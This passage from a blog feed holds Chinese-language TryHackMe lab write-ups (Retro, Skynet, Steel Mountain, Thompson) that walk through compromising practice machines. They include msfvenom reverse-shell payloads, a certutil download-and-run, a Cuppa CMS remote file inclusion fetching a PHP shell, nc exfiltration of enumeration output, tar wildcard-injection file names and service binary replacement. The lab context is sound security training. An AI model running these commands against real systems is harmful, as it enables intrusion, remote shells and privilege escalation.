http:&#x2F;&#x2F;10.10.59.241&#x2F;retro&#x2F;wp-content&#x2F;themes&#x2F;90s-retro&#x2F;style.css?ver&#x3D;5.2.1</span><br><span class="line"> | Style Name: 90s Retro</span><br><span class="line"> | Style URI: https:&#x2F;&#x2F;organicthemes.com&#x2F;retro-theme&#x2F;</span><br><span class="line"> | Description: Have you ever wished your WordPress blog looked like an old Geocities site from the 9</span><br><span class="line">0s!? Probably n...</span><br><span class="line"> | Author: Organic Themes</span><br><span class="line"> | Author URI: https:&#x2F;&#x2F;organicthemes.com</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)                                                |</span><br><span class="line"> | Version: 1.4.10 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;10.10.59.241&#x2F;retro&#x2F;wp-content&#x2F;themes&#x2F;90s-retro&#x2F;style.css?ver&#x3D;5.2.1, Match: &#39;Version: 1.4</span><br><span class="line">.10&#39;</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:06 &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; (10 &#x2F; 10) 100.00% Time: 00:00:06</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] wade</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;10.10.59.241&#x2F;retro&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] Wade</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"> </span><br><span class="line">                                                                                              [0&#x2F;1922]</span><br><span class="line">[+] WordPress theme in use: 90s-retro</span><br><span class="line"> | Location: http:&#x2F;&#x2F;10.10.59.241&#x2F;Retro&#x2F;wp-content&#x2F;themes&#x2F;90s-retro&#x2F;</span><br><span class="line"> | Latest Version: 1.4.10 (up to date)</span><br><span class="line"> | Last Updated: 2019-04-15T00:00:00.000Z</span><br><span class="line"> | Readme: http:&#x2F;&#x2F;10.10.59.241&#x2F;Retro&#x2F;wp-content&#x2F;themes&#x2F;90s-retro&#x2F;readme.txt</span><br><span class="line"> | Style URL: http:&#x2F;&#x2F;10.10.59.241&#x2F;retro&#x2F;wp-content&#x2F;themes&#x2F;90s-retro&#x2F;style.css?ver&#x3D;5.2.1               | Style Name: 90s Retro</span><br><span class="line"> | Style URI: https:&#x2F;&#x2F;organicthemes.com&#x2F;retro-theme&#x2F;</span><br><span class="line"> | Description: Have you ever wished your WordPress blog looked like an old Geocities site from the 9</span><br><span class="line">0s!? Probably n...</span><br><span class="line"> | Author: Organic Themes</span><br><span class="line"> | Author URI: https:&#x2F;&#x2F;organicthemes.com</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.4.10 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;10.10.59.241&#x2F;retro&#x2F;wp-content&#x2F;themes&#x2F;90s-retro&#x2F;style.css?ver&#x3D;5.2.1, Match: &#39;Version: 1.4</span><br><span class="line">.10&#39;</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:06 &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt; (10 &#x2F; 10) 100.00% Time: 00:00:06</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] wade</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)                                        | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;10.10.59.241&#x2F;retro&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] Wade</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 50 daily requests by registering at https:&#x2F;&#x2F;wpvulndb.com&#x2F;users&#x2F;</span><br><span class="line">sign_up</span><br><span class="line"></span><br><span class="line">[+] Finished: Wed Sep 30 04:30:21 2020</span><br><span class="line">[+] Requests Done: 52</span><br><span class="line">[+] Cached Requests: 6</span><br><span class="line">[+] Data Sent: 10.477 KB</span><br><span class="line">[+] Data Received: 239.011 KB</span><br><span class="line">[+] Memory used: 171.227 MB</span><br><span class="line">[+] Elapsed time: 00:00:21</span><br></pre></td></tr></table></figure>



<p><img src="https://images.atsud0.me/images/post/image-20200930123748045.png" alt="image-20200930123748045"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200930123806555.png" alt="image-20200930123806555"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200930131945379.png" alt="image-20200930131945379"></p>
<p>先生成shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=Your ip LPORT=1234 -f exe -o shell-thm.exe</span><br></pre></td></tr></table></figure>

<p>访问这个主题的404页面并下载执行shell。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.59.241&#x2F;Retro&#x2F;wp-content&#x2F;themes&#x2F;twentysixteen&#x2F;404.php?cmd&#x3D;certutil%20-urlcache%20-split%20-f%20http:%2f%2fYour-IP:8000%2fshell-thm.exe</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.10.59.241&#x2F;Retro&#x2F;wp-content&#x2F;themes&#x2F;twentysixteen&#x2F;404.php?cmd&#x3D;shell-thm.exe</span><br></pre></td></tr></table></figure>



<p>拿到shell。。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200930131930082.png" alt="image-20200930131930082"></p>
<h3 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h3><p>在博客上拿到密码后，完全！不！需要！在wordpress上反弹个shell。因为可以直接rdp连接。。。做到一半才想起来还开着RDP。。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200930133020922.png" alt="image-20200930133020922"></p>
<p>chrome浏览历史中有多次出现CVE-2019-1388</p>
<p><img src="https://images.atsud0.me/images/post/image-20200930133116757.png" alt="image-20200930133116757"></p>
<p>详细的复现过程：</p>
<p>总的来说就是，弹出输入密码的时候，通过点击文件的ca文件来打开浏览器，在浏览器中保存当前页面为 然后路径输入<code>C:\windowys\system32\*.*</code>跳转到system32目录下，并且能显示其他格式的文件（如果自己去点目录到system32的话，只有文件夹）之后再找到cmd 右键打开。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200930134048061.png" alt="image-20200930134048061"></p>
<p>😓，，，</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>UAC-PASS</tag>
        <tag>CVE-2019-1388</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Skynet</title>
    <url>/2020/04/19/TryHackMe-Skynet/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>本文主要涉及:</p>
<ul>
<li>smb信息枚举</li>
<li>tar通配符注入</li>
</ul>
<p><a href="https://tryhackme.com/room/skynet" target="_blank" rel="noopener">靶机链接</a></p>
<p>靶机难度:简单</p>
<a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>常规思路，上来先扫一下端口开放情况</p>
<p><code>nmap -A -vvv -sT -T5 -p- 10.10.63.198</code></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200418_162808.jpg" alt="port-open"></p>
<p>可以观察到目标开放了</p>
<ul>
<li>80 http</li>
<li>22 ssh</li>
<li>110 pop3</li>
<li>139 smb</li>
<li>143 imap</li>
<li>445 smb</li>
</ul>
<p>其中110和143都是邮件服务器的端口。<br>先进去网站看看<br><img src="https://images.atsud0.me/images/post/Screenshot_20200418_163137.jpg" alt="index.html"></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200418_163500.jpg" alt="source-index"></p>
<p>网站首页和网站源码都没什么发现，用<code>dirb</code>扫一下网站路径<br><img src="https://images.atsud0.me/images/post/Screenshot_20200418_163341.jpg" alt="dirb-path"></p>
<p>除了<code>squirrelmail</code>能访问外，其他都无法访问.<br><img src="https://images.atsud0.me/images/post/Screenshot_20200418_163601.jpg" alt="squirelmail"></p>
<p>源码里也没发现什么东西。</p>
<p>对之前探测到的smb端口进行用户枚举看看。<br><code>nmap -p445,139 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.63.198</code></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200418_163900.jpg" alt="smb-enum-shares"></p>
<p>除了使用<code>nmap</code>的smb的信息枚举脚本外，我们还能使用<br><code>smbmap -H 10.10.63.198</code></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200418_165527.jpg" alt="smbmap"></p>
<p>可以看到匿名目录允许我们可读的，并且还有一个<code>milesdyson</code>的目录，但是我们没有权限去访问它。</p>
<p>但是我们可以先看看<code>anonymous</code>里面有什么东西</p>
<p><code>smbclient //10.10.63.198/anonymous</code><br><img src="https://images.atsud0.me/images/post/Screenshot_20200418_164022.jpg" alt="smb-anonymous"></p>
<p>把东西download下来再分析.</p>
<p><code>smbget -R smb://10.10.63.198/anonymous/</code><br>下载一看，将近450M的文件，，大部分都是pdf.</p>
<p>还有一个文件名为<code>attention.txt</code>这就是让我们去读他的意思。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200418_164235.jpg" alt="attention"></p>
<p>文本内容为:</p>
<blockquote>
<p>A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.<br>-Miles Dyson</p>
</blockquote>
<p>大概意思就是提醒用户修改密码。</p>
<p>再进入到下载回来的<code>log</code>目录，里面有3个文件。</p>
<p>分别是<code>log1.txt,log2.txt,log3.txt</code></p>
<p>log2和log3都是空文本，但是<code>log1.txt</code>的内容就很有趣了，他很有可能是记载了部分用户密码的文本文件。</p>
<p>尝试用<code>milesdyson</code>作为用户名，<code>log1.txt</code>作为密码字典。使用<code>burpsplit</code>爆破密码，结果没一会就看到正确密码了。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200418_175923.jpg" alt="burp"></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200418_172404.jpg" alt="inbox"></p>
<p>得到smb password。这时我们可以去尝试登录milesdyson目录了。<br><code>smbclient //10.10.63.198/milesdyson --user=milesdyson</code></p>
<p>登录成功，看下有什么文件<br><img src="https://images.atsud0.me/images/post/Screenshot_20200418_173150.jpg" alt="smb-milesdyson"><br>进去notes目录看了之后，发现有许多markdown的文档,但是也有一个名为<code>important.txt</code>的文档<br><img src="https://images.atsud0.me/images/post/Screenshot_20200418_175246.jpg" alt="important"></p>
<ol>
<li>Add features to beta CMS /45kra24zxs28v3yd</li>
<li>Work on T-800 Model 101 blueprints</li>
<li>Spend more time with my wife</li>
</ol>
<p>这个<code>/45kra24zxs28v3yd</code>看上去像是个网站路径？</p>
<p>尝试去访问一下看看。结果还真是一个隐藏路径</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200418_181409.jpg" alt="hide-path"></p>
<blockquote>
<p>Dr. Miles Bennett Dyson was the original inventor of the neural-net processor which would lead to the development of Skynet,<br>a computer A.I. intended to control electronically linked weapons and defend the United States.</p>
</blockquote>
<p>再一次对这个路径进行dirb扫描<br><img src="https://images.atsud0.me/images/post/Screenshot_20200418_182231.jpg" alt="dirb-hide"><br>发现还有个<code>administrator</code>的管理后台</p>
<p>进去登录后台，试试邮箱的密码结果不对。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200418_182405.jpg" alt="login-admin"></p>
<p>查看源码<br><img src="https://images.atsud0.me/images/post/Screenshot_20200418_183158.jpg" alt="source-cuppa-cms"><br>发现标题是Cuppa CMS，什么内容管理系统的东东。去google搜索后，发现居然有<code>exploit</code>!!!</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200418_183943.jpg" alt="haha"></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200418_183740.jpg" alt="google-search"></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200418_183108.jpg" alt="cuppa-cms-exp"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>根据exploit的提示来试试</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200418_190408.jpg" alt="tips-expoit"><br>执行第一条并没返回什么结果，执行第二条的时候成功查看到目标机器的<code>/etc/passwd</code>文件.<br><img src="https://images.atsud0.me/images/post/Screenshot_20200418_190511.jpg" alt="etc/passwd"></p>
<p>所以我们可以利用这个漏洞去反弹一个webshell<a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" target="_blank" rel="noopener">下载php-shell</a></p>
<p>下载好payload之后，改个名字，修改端口和地址。然后用python -m SimpleHTTPServer打开我们的网页服务器，开启监听后执行以下命令:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;10.10.63.198&#x2F;45kra24zxs28v3yd&#x2F;administrator&#x2F;alerts&#x2F;alertConfigField.php\?urlConfig\&#x3D;http:&#x2F;&#x2F;10.10.245.230&#x2F;s.php</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200419_153639.jpg" alt="web-shell"></p>
<p>此时应该能返回一个shell给我们了。</p>
<p>这时可以进行机器的信息枚举了。会发现crontab有一个每分钟运行一次的脚本我们可以利用它。你可以使用信息枚举的脚本，也可以手动的去使用命令去查看。<br><code>python -m SimpleHTTPServer 80</code>将当前目录作为网站根目录，开启80端口。</p>
<p>在目标机器上执行<br><code>wget http://10.10.245.230/LinEnum.sh</code>下载你的信息枚举脚本，同理，你也可以使用这种方式去下载你的其他恶意代码文件。</p>
<p>使用nc将信息枚举后的内容下载到本地<br><code>nc -lp 1236 &gt; LinEnum-Skynet.txt</code><br><code>bash ./LinEnum.sh | nc -nv 10.10.245.230 1236 -q 1</code></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200419_132257.jpg" alt="LinEnum-crontab"></p>
<p>可以看到有个每分钟以root用户执行一次的脚本，这个脚本位于milesdyson家目录下，所以我们可以去看看，脚本的权限和脚本内容</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://images.atsud0.me/images/post/Screenshot_20200419_132608.jpg" alt="backup_sh"></p>
<p>可以明显看到脚本内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">tar cf &#x2F;home&#x2F;milesydson&#x2F;backups&#x2F;backup.tgz *</span><br></pre></td></tr></table></figure>

<p>每分钟将/var/www/html下所有的文件打包后以backup.tgz命名放到/home/milesydson/backups/下</p>
<p>这里我很傻逼的以为可以通过修改环境变量的方式，伪造一个假的tar，可以反弹一个shell给我。但是实际上这个想法是错误的，<strong>因为crontab有它单独的默认环境变量，是不会被普通用户修改的临时变量所影响到的。</strong></p>
<p><img src="https://images.atsud0.me/images/post/photo_2020-04-18_21-06-39.jpg" alt="crontab-path"></p>
<p>之后没有思路了，只能去询问各位大佬。大佬们纷纷给我提示</p>
<p><code>tar wildcard</code></p>
<p>wildcard就是通配符的英文单词，所以使用要使用通配符注入。我在此之前甚至都不知道这个这都是一个注入点。</p>
<p>结合<code>backup.sh</code>的脚本内容，所以我们可以知道<code>tar cf /home/milesdyson/backup/backup.tgz *</code>这条命令，就是我们的注入点。</p>
<p>总的来说，这似乎是个从UNIX时代遗留下来的问题，假设我们创建了一个名为 “–help”的文件</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200419_143219.jpg" alt="--help"></p>
<p>如果我们尝试去用通配符列出当前目录的所有文件的话。</p>
<p>例如:</p>
<p><code>ls *</code></p>
<p>可以看到执行效果是变成了<code>ls \--help</code>,并不是如我们所想的，列出了当前目录的所有文件。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200419_143342.jpg" alt="--help2"></p>
<p>所以我们可以利用这一漏洞去让tar执行我们的恶意代码。</p>
<p>先在Kali上面用<code>msfvenom</code>生成我们的载荷,并开启监听.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd&#x2F;unix&#x2F;reverse_netcat LHOST&#x3D;10.10.245.230 LPORT&#x3D;8888 R</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200419_144254.jpg" alt="msfve"></p>
<p>然后在目标机器的/var/www/html/下创建以下文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;&quot;&gt;&quot;--checkpoint-action&#x3D;exec&#x3D;sh shell.sh&quot;</span><br><span class="line">echo &quot;&quot;&gt;&quot;--checkpoint&#x3D;1&quot;</span><br><span class="line">echo &quot;mkfifo &#x2F;tmp&#x2F;cflw;nc 10.10.58.45 8888 0&lt;&#x2F;tmp&#x2F;clfw |&#x2F;bin&#x2F;sh &gt;&#x2F;tmp&#x2F;cflw 2&gt;&amp;1&quot;&gt;shell.sh</span><br></pre></td></tr></table></figure>
<p>将刚刚在kail上生成的恶意代码复制到目标机器上，生成一个shell.sh的文件<br><img src="https://images.atsud0.me/images/post/Screenshot_20200419_144447.jpg" alt="shell-sh"></p>
<p>所以现在我们一共生成了三个文件分别是</p>
<ul>
<li>--checkpoint-action=exec=sh shell.sh</li>
<li>--checkpoint=1</li>
<li>shell.sh</li>
</ul>
<p>正常来说，创建好这三个文件后。一分钟后就能监听窗口拿到root权限shell的回调了。</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200419_145731.jpg" alt="root"></p>
<p>--checkpoint[=number] 每个处理指定数量的记录，就显示一次进度（这个文件可以不创建。所以实际上只需要两个文件。<br>--checkpoint-action=ACTION在每个检查点上执行ACTION，所以这个选项是用来规定达到检查点时执行程序。它允许我们执行任意的命令。</p>
<p>关于通配符提权的更多文章:</p>
<ul>
<li><a href="https://www.secpulse.com/archives/72965.html" target="_blank" rel="noopener">利用通配符实现Linux本地提权-安全脉搏</a></li>
<li><a href="https://www.freebuf.com/articles/system/175453.html" target="_blank" rel="noopener">如何使用Cron Jobs实现Linux提权</a></li>
<li><a href="https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/" target="_blank" rel="noopener">Exploiting wildcards on Linux</a></li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶机，让我知道了smbmap这个工具，以及它的基本用法。但是对我收获更大的是Linux通配符注入这一知识点。在此之前，我也试过创建过以”-“开头的文件，也知道系统会把它认为是个命令，而不是文件，但是我脑子却没转过来，去利用这一特点去执行恶意代码。</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>smb-enum</tag>
        <tag>wildcard</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Steel_Mountain</title>
    <url>/2020/04/14/TryHackMe-Steel-Mountain/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a href="https://tryhackme.com/room/steelmountain" target="_blank" rel="noopener">房间</a></p>
<p>靶机难度:简单</p>
<a id="more"></a>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap 扫描之后会发现目标机器开了两个网页服务器<br><img src="https://images.atsud0.me/images/post/image-1586860607002.png" alt="file"><br><img src="https://images.atsud0.me/images/post/image-1586854350058.png" alt="file"></p>
<p>我们可以访问一下。<br>80端口只有一个图片，<br>并且是IIs8.5版本的中间件.<br>而8080则是一个httpfileserver 2.3版本的中间件。<br><img src="https://images.atsud0.me/images/post/image-1586860324381.png" alt="file"><br><img src="https://images.atsud0.me/images/post/image-1586860303117.png" alt="file"><br>对这服务版本进行漏洞检索<br><img src="https://images.atsud0.me/images/post/image-1586860471087.png" alt="file"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>发现有存在可利用的漏洞，进msf看看。<br><img src="https://images.atsud0.me/images/post/image-1586860755905.png" alt="file"><br>设置好目标端口和IP后，开始利用就好。<br><img src="https://images.atsud0.me/images/post/image-1586605145063.png" alt="file"><br>已经拿到初步后门，但是权限仅限于bill用户</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://images.atsud0.me/images/post/image-1586605239465.png" alt="file"><br>上传PowerUp.ps1文件，你可以在<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" target="_blank" rel="noopener">这里</a>下载<br>这个脚本的作用是枚举目标机器并确定该机器上的异常服务错误的权限配置</p>
<blockquote>
<p>To enumerate this machine, we will use a powershell script called PowerUp, that’s purpose is to evaluate a Windows machine and determine any abnormalities - “PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.”</p>
</blockquote>
<p>关于这个脚本更多的信息可以查看<a href="https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/" target="_blank" rel="noopener">这里</a></p>
<p>执行这个脚本，执行这个脚本之前我们需要先载入powershell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load powershell</span><br><span class="line">powershell_shell 开启powershell</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-1586605276987.png" alt="file"><br>拿到flag1</p>
<p><img src="https://images.atsud0.me/images/post/image-1586605081000.png" alt="file"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">. .\PowerUp.ps1</span><br><span class="line">Invoke-AllChecks</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/image-1586605049835.png" alt="file"><br>关注AdvancedSystemCareService9这个服务的CanRestart,如果它为True，说明我们可以手动去关闭这个服务，并使用非法的木马程序替换掉合法的程序。</p>
<p><img src="https://images.atsud0.me/images/post/image-1586658203435.png" alt="file"><br>生成木马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;IP LPORT&#x3D;443 -e x86&#x2F;shikata_ga_nai -f exe -o ASCService.exe</span><br></pre></td></tr></table></figure>
<p>将服务关闭后，切换到服务程序所在路径。上传由我们生成的ASCService.exe替换掉原来的ASCService.exe</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sc stop [servicename]</span><br><span class="line">upload ASCService.exe</span><br><span class="line">sc start [servicename]</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/image-1586659135376.png" alt="file"></p>
<p><img src="https://images.atsud0.me/images/post/image-1586658604586.png" alt="file"><br>拿到root权限。</p>
<h2 id="额外练习——不使用msf利用cve2014-6287"><a href="#额外练习——不使用msf利用cve2014-6287" class="headerlink" title="额外练习——不使用msf利用cve2014-6287"></a>额外练习——不使用msf利用cve2014-6287</h2><p><a href="https://www.exploit-db.com/exploits/39161" target="_blank" rel="noopener">expolit</a><br>这个exp也是我们在上面所利用的。而这一次，我们不使用msf，去使用这个exploit。<br>为了达到这一目标，我们需要有一个web服务器，nc监听端口。所以要打开多个终端。<br>并且我们需要下载<a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe" target="_blank" rel="noopener">nc.exe</a><br>将下载的ncat.exe改名字为nc.exe后，放在你web的根目录，因为我们只是执行渗透攻击流程，并不需要什么很好看功能强大的网站。<br>我们可以直接使用python来运行一个网站。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPService</span><br></pre></td></tr></table></figure>
<p>修改下载好的exp的IP和监听端口配置。<br><img src="https://images.atsud0.me/images/post/image-1586862953454.png" alt="file"><br>开启另外一个终端，开始监听。同时，执行exploit文件，以获得初步shell。<br>你需要执行两次exploit，因为它第一次执行，是将nc.exe拉入目标系统中，而第二次则是执行我们的有效负载获得回调。</p>
<blockquote>
<p>You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!</p>
</blockquote>
<p>房间这里向我们介绍了另外一个windows下的枚举信息的脚本——winPEAS它和LinEnum.sh差不多。<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS" target="_blank" rel="noopener">这里下载</a><br>但是拿到cmd shell之后怎我们怎么上传我们的木马来替换合法的服务程序或者说是枚举脚本呢？<br>因为我们是开启了一个web服务器的，所以 我们可以把要上传的文件放在网站根目录下。在目标机器cmd shell 中运行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;ip&#x2F;winPEAS.exe</span><br></pre></td></tr></table></figure>
<p>然后我们就可以使用winPEAS.exe进行枚举了。<br>我们也可以使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -c &quot;get-service&quot;</span><br></pre></td></tr></table></figure>
<p>来看本机运行的服务名称<br>最后的提权步骤，和上面的提权步骤是相同的。<br><img src="https://images.atsud0.me/images/post/image-1586851721239.png" alt="file"></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
        <tag>cve-2014-6287</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Thompson</title>
    <url>/2020/05/02/TryHackMe-Thompson/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>靶机链接:<a href="https://tryhackme.com/room/bsidesgtthompson" target="_blank" rel="noopener">Thompson</a></p>
<p>难度:十分简单</p>
<a id="more"></a>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>扫描后目标机器只开放了8009,8080,22端口<br><img src="https://images.atsud0.me/images/post/Screenshot_20200502_191434.jpg" alt="nmap"></p>
<p>访问网站，尝试使用默认密码登录，结果成功了。。。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200502_191543.jpg" alt="gotit"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>打开msfconsole使用<code>tomcat_mgr_upload</code>模块。</p>
<p>运行之后就拿到shell了。</p>
<p>查看/etc/passwd会发现还有一个用户<code>jack</code><br><img src="https://images.atsud0.me/images/post/Screenshot_20200502_191900.jpg" alt="jack"></p>
<p>前往它的家目录后，会发现有第一个flag和两个有趣的文件.</p>
<ul>
<li>id.sh</li>
<li>test.txt<br><img src="https://images.atsud0.me/images/post/Screenshot_20200502_191803.jpg" alt="get-flag1"></li>
</ul>
<p>分别查看两个文件之后，会发现是id.sh执行id命令后会将结果重定向到test.txt文件。看输出结果，可以肯定是以root身份执行的，而且这个文件是777权限。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200502_192108.jpg" alt="test"><br><img src="https://images.atsud0.me/images/post/Screenshot_20200502_192147.jpg" alt="sh"></p>
<p>metepater的shell有点不方便，手动生成一个shell，之后使用python生成一个交互性tty。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
<p>使用msf生成我们的反向连接，重写id.sh</p>
